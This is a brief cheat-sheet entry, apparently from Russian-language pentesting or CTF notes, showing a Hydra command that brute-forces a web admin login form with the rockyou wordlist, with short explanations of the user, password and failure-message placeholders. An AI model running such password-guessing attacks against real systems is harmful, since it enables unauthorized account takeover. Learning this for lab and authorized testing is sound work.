
```bash

hydra -l john -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid." -V

```

`^USER^` - место подстановки пользователя
`^PASS^` - место подставной пароля 
`F=` - сообщение об ошибке